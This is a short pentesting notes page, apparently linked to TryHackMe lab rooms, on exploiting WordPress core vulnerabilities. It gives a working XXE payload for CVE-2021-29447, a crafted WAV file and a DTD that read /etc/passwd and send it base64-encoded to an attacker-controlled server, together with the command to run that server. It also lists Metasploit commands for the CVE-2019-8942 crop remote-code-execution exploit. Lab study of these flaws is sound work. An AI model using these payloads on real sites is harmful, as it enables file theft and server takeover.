# WordPress Core Exploitation

<div class="row row-cols-lg-2"><div>

WordPress core still has many [vulnerabilities](https://wpscan.com/wordpresses/) over the years.

* [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447) which you can exploit following [wpscan](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5/) notes.

[![wordpresscve202129447](../../../../../../cybersecurity/_badges/thm-p/wordpresscve202129447.svg)](https://tryhackme.com/r/room/wordpresscve202129447)

```shell!
$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/xxx.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
$ cat xxx.dtd
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
$ php -S 0.0.0.0:PORT
```
</div><div>

* [CVE-2019-8942](https://nvd.nist.gov/vuln/detail/CVE-2019-8942) which can be exploited with metasploit

[![blog](../../../../../../cybersecurity/_badges/thm-p/blog.svg)](https://tryhackme.com/r/room/blog)

```ps
msf6> use exploit/multi/http/wp_crop_rce
msf6> set LHOST tun0
msf6> set RHOST example.com
msf6> set USERNAME xxx
msf6> set PASSWORD xxx
```
</div></div>